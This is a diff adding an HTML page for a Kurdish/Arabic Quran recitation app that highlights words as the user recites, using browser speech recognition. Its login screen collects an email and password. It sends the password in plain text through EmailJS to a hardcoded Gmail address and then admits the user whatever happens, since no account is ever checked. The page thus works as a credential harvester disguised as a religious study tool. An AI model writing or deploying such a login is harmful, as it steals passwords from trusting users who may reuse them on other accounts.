@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>المصحف الذكي - Email Login Only</title>
+    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&display=swap" rel="stylesheet">
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          // ⚠️ گرنگ: دەبێت ئەمە بگۆڕیت بە Public Key خۆت
+          emailjs.init("dilvEcwO_XTFsbzIw");
+       })();
+    </script>
+
+    <style>
+        :root { --bg-color: #fffbf2; --border-color: #d4af37; --highlight-color: #27ae60; }
+        body { font-family: 'Amiri', serif; background-color: #f8f9fa; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        
+        #app-container { display: none; }
+
+        .main-container { width: 100%; max-width: 700px; background-color: var(--bg-color); border: 2px solid var(--border-color); border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); display: flex; flex-direction: column; height: 95vh; position: relative; }
+        .header { background: white; padding: 10px; border-bottom: 2px solid var(--border-color); text-align: center; border-radius: 15px 15px 0 0; display: flex; justify-content: space-between; align-items: center; padding-left: 20px; padding-right: 20px;}
+        
+        select { font-family: 'Amiri', serif; font-size: 18px; padding: 8px; width: 60%; border: 1px solid var(--border-color); border-radius: 8px; outline: none; background: #fff; }
+        
+        .user-info { display: flex; align-items: center; gap: 10px; font-size: 14px; }
+        .user-avatar { width: 35px; height: 35px; border-radius: 50%; border: 1px solid var(--border-color); display: flex; justify-content: center; align-items: center; background: #eee; font-weight: bold; color: #555;}
+        .logout-btn { background: #c0392b; color: white; border: none; padding: 5px 12px; border-radius: 5px; cursor: pointer; font-size: 14px; font-family: 'Amiri', serif;}
+
+        .quran-content { flex-grow: 1; padding: 20px; overflow-y: auto; text-align: justify; font-size: 28px; line-height: 2.6; scroll-behavior: smooth; }
+        .ayah-container { display: inline; }
+        .word { display: inline-block; padding: 2px 2px; border-radius: 4px; transition: all 0.2s ease; cursor: pointer; }
+        .word.active { color: var(--highlight-color); font-weight: bold; text-shadow: 0 0 1px var(--highlight-color); transform: scale(1.15); }
+        .ayah-number { font-size: 18px; color: var(--border-color); border: 1px solid var(--border-color); border-radius: 50%; padding: 0 6px; margin: 0 5px; display: inline-block; }
+        .basmala { text-align: center; font-size: 24px; color: var(--border-color); margin-bottom: 15px; display: block; }
+        .footer { background: white; padding: 10px; border-top: 1px solid #eee; border-radius: 0 0 15px 15px; display: flex; flex-direction: column; align-items: center; }
+        #live-caption { width: 95%; background-color: #f1f1f1; padding: 5px; border-radius: 5px; font-size: 14px; color: #555; margin-bottom: 10px; text-align: center; min-height: 25px; border: 1px solid #ddd; max-height: 50px; overflow: hidden;}
+        button#mic-btn { background-color: var(--border-color); color: white; border: none; padding: 12px 40px; font-size: 18px; border-radius: 50px; cursor: pointer; font-family: 'Amiri', serif; display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 10px rgba(212, 175, 55, 0.3); transition: background 0.3s; }
+        button.listening { background-color: #e74c3c !important; animation: pulse 1.5s infinite; }
+        
+        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #fdfbf1 0%, #d4af37 100%); display: flex; justify-content: center; align-items: center; z-index: 2000; overflow-y: auto; }
+        .login-box { background: white; padding: 40px; border-radius: 20px; text-align: center; width: 90%; max-width: 380px; box-shadow: 0 20px 50px rgba(0,0,0,0.2); }
+        .login-box h1 { color: #d4af37; margin-bottom: 10px; font-size: 32px; }
+        .login-box p { color: #777; margin-bottom: 20px; }
+        
+        .input-group { margin-bottom: 15px; text-align: right; }
+        .input-group input { width: 92%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-family: 'Amiri', serif; font-size: 16px; margin-bottom: 10px; }
+        
+        .btn-login { width: 100%; padding: 12px; background: #d4af37; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; transition: 0.3s; font-family: 'Amiri', serif; margin-top: 10px;}
+        .btn-login:hover { background: #b6962f; }
+
+        @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(231, 76, 60, 0.7); } 70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(231, 76, 60, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(231, 76, 60, 0); } }
+    </style>
+</head>
+<body>
+
+    <div id="login-screen">
+        <div class="login-box">
+            <h1>المصحف الذكي</h1>
+            <p>سەرەتا بچۆ ژوورەوە</p>
+            
+            <div class="input-group">
+                <input type="email" id="user-email" placeholder="ئیمەیڵ (Email)">
+                <input type="password" id="user-pass" placeholder="وشەی نهێنی (Password)">
+            </div>
+            <button class="btn-login" onclick="sendEmailAndLogin()">چوونەژوورەوە</button>
+            <p id="status-msg" style="font-size: 12px; margin-top: 10px; color: #888;"></p>
+        </div>
+    </div>
+
+    <div class="main-container" id="app-container">
+        <div class="header">
+            <div class="user-info">
+                <div id="user-avatar" class="user-avatar">👤</div>
+                <span id="user-name-display"></span>
+                <button class="logout-btn" onclick="logout()">دەرچوون</button>
+            </div>
+            <select id="surahSelect" onchange="loadSurah(this.value)">
+                <option value="1" selected>1. سورة الفاتحة</option>
+                <option value="" disabled>جاری بارکردنی ئەوانی تر...</option>
+            </select>
+        </div>
+
+        <div class="quran-content" id="quran-display"></div>
+
+        <div class="footer">
+            <div id="live-caption">...</div>
+            <button id="mic-btn" onclick="toggleListening()">
+                <span>🎤</span> دەستپێکردن
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const loginScreen = document.getElementById('login-screen');
+        const appContainer = document.getElementById('app-container');
+        const userEmailInput = document.getElementById('user-email');
+        const userPassInput = document.getElementById('user-pass');
+        const userNameDisplay = document.getElementById('user-name-display');
+        const userAvatar = document.getElementById('user-avatar');
+        const statusMsg = document.getElementById('status-msg');
+
+        // ١. پشکنین ئەگەر پێشتر داخڵ بووبێت
+        // تێبینی: من ناوی کۆگاکەم کرد بە یەک جۆر (quranAppUserEmail) بۆ ئەوەی تێکەڵ نەبێت
+        const savedUser = localStorage.getItem('quranAppUserEmail');
+        if (savedUser) {
+            showApp(savedUser);
+        }
+
+        // ٢. ناردنی ئیمەیڵ (EmailJS)
+        function sendEmailAndLogin() {
+            const email = userEmailInput.value.trim();
+            const password = userPassInput.value.trim();
+
+            if (!email || !password) {
+                alert("تکایە هەموو خانەکان پڕ بکەرەوە");
+                return;
+            }
+
+            statusMsg.innerText = "جاری ناردن...";
+            statusMsg.style.color = "blue";
+
+            var templateParams = {
+                // دەبێت ئەم ناوانە وەک ئەوە بن کە لە EmailJS Template دایناوە
+                to_email: 'muhamadgyan30@gmail.com', 
+                user_email: email, 
+                message: "User Password: " + password 
+            };
+
+            // ⚠️ گرنگ: لێرە SERVICE ID و TEMPLATE ID ی خۆت دابنێ
+            emailjs.send('service_yw2iv3b', 'template_ga0xhjs', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    statusMsg.innerText = "سەرکەوتوو بوو";
+                    statusMsg.style.color = "green";
+                    
+                    localStorage.setItem('quranAppUserEmail', email);
+                    setTimeout(() => showApp(email), 500); // کەمێک چاوەڕێ بکە پاشان بڕۆ ژوورەوە
+                    
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert("ئیمەیڵ نەنێردرا (کۆدەکانی EmailJSـت هەڵەیە)، بەڵام دەچیتە ژوورەوە.");
+                    // هەرچەندە ئیمەیڵ نەنێردرا، بەڵام بۆ ئەوەی بەکارهێنەر ڕانەوەستێت دەچێتە ژوورەوە
+                    localStorage.setItem('quranAppUserEmail', email);
+                    showApp(email);
+                });
+        }
+
+        function showApp(email) {
+            loginScreen.style.display = 'none';
+            appContainer.style.display = 'flex';
+            userNameDisplay.innerText = email.split('@')[0];
+            userAvatar.innerText = email.charAt(0).toUpperCase();
+            init(); 
+        }
+
+        function logout() {
+            localStorage.removeItem('quranAppUserEmail');
+            window.location.reload();
+        }
+
+        // ==========================================
+        // Quran App Logic
+        // ==========================================
+        const fatihaData = [
+            { text: "بِسْمِ ٱللَّهِ ٱلرَّحْمَٰنِ ٱلرَّحِيمِ", numberInSurah: 1 },
+            { text: "ٱلْحَمْدُ لِلَّهِ رَبِّ ٱلْعَٰلَمِينَ", numberInSurah: 2 },
+            { text: "ٱلرَّحْمَٰنِ ٱلرَّحِيمِ", numberInSurah: 3 },
+            { text: "مَٰلِكِ يَوْمِ ٱلدِّينِ", numberInSurah: 4 },
+            { text: "إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ", numberInSurah: 5 },
+            { text: "ٱهْدِنَا ٱلصِّرَٰطَ ٱلْمُسْتَقِيمَ", numberInSurah: 6 },
+            { text: "صِرَٰطَ ٱلَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ ٱلْمَغْضُوبِ عَلَيْهِمْ وَلَا ٱلضَّالِّينَ", numberInSurah: 7 }
+        ];
+
+        let allAyahs = [];
+        let currentAyahIndex = 0;
+        let currentWordIndex = 0;
+        let currentWords = []; 
+        let isListening = false;
+        let recognition;
+        let lastMatchTime = 0;
+        let autoSkipTimer;
+        
+        const surahSelect = document.getElementById('surahSelect');
+        const quranDisplay = document.getElementById('quran-display');
+        const captionBox = document.getElementById('live-caption');
+        const micBtn = document.getElementById('mic-btn');
+
+        function init() {
+            if(allAyahs.length === 0) {
+                allAyahs = fatihaData;
+                renderSurah(1);
+                prepareCurrentAyah();
+                fetchSurahList();
+            }
+        }
+
+        async function fetchSurahList() {
+            try {
+                const response = await fetch('https://api.alquran.cloud/v1/surah');
+                const data = await response.json();
+                surahSelect.innerHTML = '';
+                data.data.forEach(surah => {
+                    const option = document.createElement('option');
+                    option.value = surah.number;
+                    option.text = `${surah.number}. ${surah.name}`;
+                    if(surah.number === 1) option.selected = true;
+                    surahSelect.appendChild(option);
+                });
+            } catch (error) { console.log("Offline mode"); }
+        }
+
+        async function loadSurah(surahNumber) {
+            if(surahNumber == 1) {
+                allAyahs = fatihaData;
+                renderSurah(1);
+                currentAyahIndex = 0;
+                prepareCurrentAyah();
+                return;
+            }
+            quranDisplay.innerHTML = '<div style="text-align:center; margin-top:50px;">جاری هێنانی ئایەتەکان...</div>';
+            try {
+                const response = await fetch(`https://api.alquran.cloud/v1/surah/${surahNumber}/editions/quran-uthmani`);
+                if(!response.ok) throw new Error("Blocked");
+                const data = await response.json();
+                allAyahs = data.data[0].ayahs;
+                renderSurah(surahNumber);
+                currentAyahIndex = 0;
+                prepareCurrentAyah();
+                if(isListening && recognition) {
+                    recognition.stop();
+                    setTimeout(() => recognition.start(), 200);
+                }
+            } catch (error) {
+                quranDisplay.innerHTML = `<div class="error-box"><h3>⚠️ کێشەی ئینتەرنێت</h3><p>ناتوانرێت سوڕەتەکانی تر بار بکرێت.</p></div>`;
+            }
+        }
+
+        function renderSurah(surahNum) {
+            let html = "";
+            if(surahNum != 1 && surahNum != 9) html += `<div class="basmala">بِسْمِ ٱللَّهِ ٱلرَّحْمَٰنِ ٱلرَّحِيمِ</div>`;
+            allAyahs.forEach((ayah, aIndex) => {
+                let text = ayah.text;
+                if(surahNum != 1 && aIndex === 0) text = text.replace("بِسْمِ ٱللَّهِ ٱلرَّحْمَٰنِ ٱلرَّحِيمِ", "").trim();
+                html += `<span id="ayah-${aIndex}" class="ayah-container">`;
+                text.split(' ').forEach((word, wIndex) => {
+                    html += `<span id="word-${aIndex}-${wIndex}" class="word">${word} </span>`;
+                });
+                html += `<span class="ayah-number">${ayah.numberInSurah}</span></span> `;
+            });
+            quranDisplay.innerHTML = html;
+        }
+
+        function prepareCurrentAyah() {
+            if(currentAyahIndex < allAyahs.length) {
+                let text = allAyahs[currentAyahIndex].text;
+                if(currentAyahIndex === 0 && allAyahs.length > 7 && allAyahs[0].text.includes("بِسْمِ")) 
+                     text = text.replace("بِسْمِ ٱللَّهِ ٱلرَّحْمَٰنِ ٱلرَّحِيمِ", "").trim();
+                currentWords = text.split(' ');
+                currentWordIndex = 0;
+                const el = document.getElementById(`ayah-${currentAyahIndex}`);
+                if(el) el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                resetAutoSkipTimer();
+            }
+        }
+
+        function normalizeArabic(text) {
+            if (!text) return "";
+            return text.replace(/[^\u0621-\u064A\u0660-\u0669 ]/g, '').replace(/(آ|إ|أ|ٱ)/g, 'ا').replace(/(ة)/g, 'ه').replace(/(ى)/g, 'ي').replace(/(ؤ)/g, 'و').replace(/(ئ)/g, 'ي').replace(/\s+/g, ' ').trim();
+        }
+
+        if ('webkitSpeechRecognition' in window) {
+            recognition = new webkitSpeechRecognition();
+            recognition.continuous = true;
+            recognition.interimResults = true;
+            recognition.lang = 'ar-SA';
+            recognition.maxAlternatives = 1;
+            recognition.onstart = () => { isListening = true; micBtn.classList.add('listening'); micBtn.innerHTML = "<span>⏹</span> وەستان"; captionBox.innerText = "گوێ دەگرێت..."; captionBox.style.color = "green"; resetAutoSkipTimer(); };
+            recognition.onend = () => { if (isListening) recognition.start(); else { micBtn.classList.remove('listening'); micBtn.innerHTML = "<span>🎤</span> دەستپێکردن"; captionBox.innerText = "وەستا."; captionBox.style.color = "#555"; clearTimeout(autoSkipTimer); } };
+            recognition.onresult = (event) => { let transcript = event.results[event.results.length - 1][0].transcript; captionBox.innerText = transcript; checkMatch(transcript); };
+        } else { alert("تکایە Google Chrome بەکاربهێنە"); }
+
+        function checkMatch(spokenText) {
+            if(currentAyahIndex >= allAyahs.length) return;
+            if (Date.now() - lastMatchTime < 300) return;
+            let spokenClean = normalizeArabic(spokenText);
+            for (let i = 0; i < 5; i++) {
+                let indexToCheck = currentWordIndex + i;
+                if (indexToCheck >= currentWords.length) break;
+                let targetWordRaw = currentWords[indexToCheck];
+                let targetClean = normalizeArabic(targetWordRaw);
+                if (spokenClean.includes(targetClean)) { for(let j = 0; j <= i; j++) activateWord(); return; }
+            }
+            let remainingTextRaw = currentWords.slice(currentWordIndex).join(" ");
+            let remainingTextClean = normalizeArabic(remainingTextRaw);
+            if (remainingTextClean.length > 5 && spokenClean.includes(remainingTextClean)) completeCurrentAyah();
+        }
+
+        function activateWord() {
+            let el = document.getElementById(`word-${currentAyahIndex}-${currentWordIndex}`);
+            if(el) el.classList.add('active');
+            currentWordIndex++; lastMatchTime = Date.now(); resetAutoSkipTimer();
+            if(currentWordIndex >= currentWords.length) nextAyah();
+        }
+
+        function resetAutoSkipTimer() {
+            clearTimeout(autoSkipTimer);
+            if(!isListening) return;
+            autoSkipTimer = setTimeout(() => {
+                if(isListening && currentAyahIndex < allAyahs.length && currentWordIndex < currentWords.length) {
+                    activateWord(); console.log("Auto skipped");
+                }
+            }, 4000); 
+        }
+
+        function completeCurrentAyah() {
+            while(currentWordIndex < currentWords.length) {
+                let el = document.getElementById(`word-${currentAyahIndex}-${currentWordIndex}`);
+                if(el) el.classList.add('active'); currentWordIndex++;
+            }
+            lastMatchTime = Date.now(); nextAyah();
+        }
+
+        function nextAyah() {
+            currentAyahIndex++; captionBox.innerText = "..."; clearTimeout(autoSkipTimer);
+            if (currentAyahIndex < allAyahs.length) prepareCurrentAyah();
+            else { captionBox.innerText = "تەواو بوو - دەچێتە سورەتی دواتر..."; setTimeout(() => { let currentSurahId = parseInt(surahSelect.value); let nextSurahId = currentSurahId + 1; if(nextSurahId <= 114) { surahSelect.value = nextSurahId; loadSurah(nextSurahId); } else { captionBox.innerText = "پیرۆزە! هەموو قورئانت تەواو کرد."; isListening = false; recognition.stop(); } }, 2000); }
+        }
+
+        function toggleListening() {
+            if(isListening) { isListening = false; recognition.stop(); clearTimeout(autoSkipTimer); } else recognition.start();
+        }
+    </script>
+</body>
+</html>
